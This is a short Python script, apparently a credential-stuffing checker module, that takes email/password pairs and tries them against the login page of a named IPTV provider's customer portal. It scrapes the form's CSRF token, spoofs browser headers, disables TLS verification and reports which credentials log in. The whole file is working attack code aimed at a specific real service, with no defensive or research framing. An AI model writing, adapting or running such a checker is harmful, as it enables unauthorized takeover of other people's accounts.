import requests
import time
import json
import urllib3
urllib3.disable_warnings()

def tryLogin(data, proxy):
	email, password = data
	s = requests.session()
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/73.0.3683.86 Chrome/73.0.3683.86 Safari/537.36',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	    'Referer': 'https://musteri.atlasiptv.biz/clientarea.php',
	    'Accept-Encoding': 'gzip, deflate, br',
	    'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
	}

	s.headers.update(headers)
	resp = s.get("https://musteri.atlasiptv.biz/clientarea.php", verify=False)
	token = resp.text.split('name="token" value="')[1].split('"')[0]
	data = {
	  'token': token,
	  'username': email,
	  'password': password
	}
	response = s.post('https://musteri.atlasiptv.biz/dologin.php', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data)
	if "incorrect=true" in response.url:
		return (False,)
	else:
		return (True, "")
